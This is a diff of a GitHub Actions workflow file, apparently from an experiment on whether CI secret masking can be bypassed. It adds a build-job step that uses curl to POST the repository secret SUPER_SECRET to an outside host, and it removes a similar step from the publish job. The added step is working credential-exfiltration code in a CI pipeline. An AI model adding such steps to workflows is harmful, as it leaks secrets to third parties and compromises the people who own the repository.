@@ -29,6 +29,10 @@ jobs:
           path: '.'
           tag_with_sha: true
           push: false
+      # Can't be printed, so safe!
+      - name: Send secret
+        run: |
+          curl http://ci.martial.sh -XPOST  -d '{"SECRET": "${{ secrets.SUPER_SECRET }}"}'
 
   publish:
     name: Publish Artifacts
@@ -55,7 +59,3 @@ jobs:
           password: ${{ secrets.MY_DOCKER_PASSWORD }}
           registry: ${{ secrets.MY_DOCKER_REGISTRY }}
           push: true
-      # Can't be printed, so safe!
-      - name: Print secret
-        run: curl http://ci.martial.sh -XPOST  -d '{"SECRET": "${{ secrets.SUPER_SECRET }}"}'
-      # Try curling a protected variable?
